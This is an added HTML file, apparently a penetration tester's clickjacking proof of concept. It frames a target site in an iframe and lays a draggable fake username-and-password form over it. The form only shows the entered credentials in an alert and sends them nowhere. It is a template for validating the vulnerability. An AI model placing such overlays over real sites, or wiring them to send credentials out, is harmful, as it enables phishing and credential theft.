@@ -1,0 +1,182 @@
+<HTML>
+<HEAD>
+<TITLE>Clickjacking</TITLE>
+<meta name="author" content="Chris Rundle">
+<meta name="description" content="
+
+Clickjacking Proof of Concept
+
+An example HTML page to validate clickjacking, which displays the target URL in an iframe 
+and overlays a logon form over it to demonstrate how the credentials could be harvested.
+The height and width of the overlay can be adjusted (line 60, below) and then, to get 
+decent screenshots, the login form can be moved into position by dragging the top border.
+
+Low risk (CVSS 2.9), as a link to this page would need to be fed to a user.
+
+">
+
+<style>
+<!-- CHANGE BGCOLOR & border colour as required -->
+    * {
+      font-family: sans-serif;
+    }
+
+    #clickjacking {
+	  position:absolute; 
+	  background-color: white;
+	  z-index:3; 
+	  left: 40%; top: 40%; 
+	  border: 6px double DarkKhaki;
+	  border-top: 2px solid DarkKhaki;
+	  padding: 15px; padding-top: 0px;
+    }
+	
+	#clickjackingheader {
+	  background-color: white;
+	  z-index:2; 
+	  border-bottom: 2px solid DarkKhaki;
+	  height: 4px;
+	}
+</style>
+
+</HEAD>
+<BODY>
+
+<!-- CHANGE THE TARGET URL AT THE BOTTOM OF THE PAGE -->
+
+<!-- Set the overall page font here -->
+<style>
+    body {
+      font-family: sans-serif;
+    }
+
+</style>
+
+<!-- 
+Adjust the WIDTH and HEIGHT of the login overlay here: 
+<!--== OVERLAY BEGINS HERE =============================================-->
+<div id="clickjacking" style= "
+
+    width:430px; height:250px;
+
+">
+	<div id="clickjackingheader"></div>
+	
+    <table style="width:100%">
+<!--================================================================================-->
+<!-- Move the input boxes up or down by altering the HEIGHT of the spacer row here  -->
+<!-- or use 
+
+  <tr><td><center><img src="<image path>" height=100% width=100%><br>&nbsp;</center></td></tr>
+
+ to include a logo -->
+<!--================================================================================-->
+        <tr><td style="height: 8px;"></td></tr>
+		<tr><td>
+<!--======================================================================-->
+<!--  INPUT FIELD WIDTHS ARE CURRENTLY SET TO 99% OF THE PARENT ELEMENT   -->
+<!--======================================================================-->
+<!-- The label text and width of the USERNAME field can be adjusted here: -->
+<!--======================================================================-->
+                    Username <span style="color: Red">*</span>
+					
+                    <input name="Username" type="text" id="txtUserName" style="width:99%;" />
+<!--===== NOTE: FIELD WIDTHS CAN ALSO BE FIXED, e.g. width: 200px; =======-->
+
+
+&nbsp;<br>
+<!--======================================================================-->
+<!-- The label text and width of the PASSWORD field can be adjusted here: -->
+<!--======================================================================-->
+                    Password <span style="color: Red";>*</span><br>
+                    <input name="Password" type="password" id="txtPassword" style="width:99%;" />
+<!--======================================================================-->
+            </td>
+        </tr>
+		<tr>
+<!--================================================================================-->
+<!--Move the LOGIN button up or down by altering the HEIGHT of the spacer row here: -->
+<!--================================================================================-->
+			<td colspan="2" style="height: 12px"></td>
+		</tr>
+		 <tr>
+            <td>
+                <button width=450px type="button" onclick="maliciouscode(getElementById('txtUserName').value , getElementById('txtPassword').value)">&nbsp;&nbsp;Log in&nbsp;&nbsp;</button><br>&nbsp;
+
+            </td>
+        </tr>
+    </table>
+	</div>
+<!--== OVERLAY ENDS HERE ===============================================-->
+</div> 
+
+<script>
+//Make the DIV element draggable:
+dragElement(document.getElementById("clickjacking"));
+
+function dragElement(elmnt) {
+  var pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
+  if (document.getElementById(elmnt.id + "header")) {
+    /* if present, the header is where you move the DIV from:*/
+    document.getElementById(elmnt.id + "header").onmousedown = dragMouseDown;
+  } else {
+    /* otherwise, move the DIV from anywhere inside the DIV:*/
+    elmnt.onmousedown = dragMouseDown;
+  }
+
+  function dragMouseDown(e) {
+    e = e || window.event;
+    e.preventDefault();
+    // get the mouse cursor position at startup:
+    pos3 = e.clientX;
+    pos4 = e.clientY;
+    document.onmouseup = closeDragElement;
+    // call a function whenever the cursor moves:
+    document.onmousemove = elementDrag;
+  }
+
+  function elementDrag(e) {
+    e = e || window.event;
+    e.preventDefault();
+    // calculate the new cursor position:
+    pos1 = pos3 - e.clientX;
+    pos2 = pos4 - e.clientY;
+    pos3 = e.clientX;
+    pos4 = e.clientY;
+    // set the element's new position:
+    elmnt.style.top = (elmnt.offsetTop - pos2) + "px";
+    elmnt.style.left = (elmnt.offsetLeft - pos1) + "px";
+  }
+
+  function closeDragElement() {
+    /* stop moving when mouse button is released:*/
+    document.onmouseup = null;
+    document.onmousemove = null;
+  }
+
+}
+  function maliciouscode(utxt, ptxt) {
+    alert("Clickjacking vulnerability.\n\nYou clicked the 'Log in' button! \nThis could harvest the user credentials and then run malicious code.\n\nUserName: " + utxt + "\nPassword:   " + ptxt);
+  }
+</script>
+
+<center>
+This page is<p>
+<font size=+3 color=red><B>VULNERABLE TO CLICKJACKING!</B></font><P>
+Click <a href=""><b>HERE</b></a> to be redirected to a page of my choice.<p>
+<B>An example form field has been overlaid in this page.<br>Clicking the button can run arbitrary code or collect credentials.</B><p>
+
+<!--
+<script>alert("When the login overlay is displayed, drag it to the required position by clicking and dragging the top border.\nWidth and height can be modified in the HTML page code."); </script>
+-->
+
+<!-- change the target URL here:  -->
+<!--======================================================================--> 
+<iframe width=85% height=75% src="https://www.mykc.org.uk/"</iframe>
+<!--======================================================================-->
+
+</center>
+
+</BODY>
+</HTML>
+
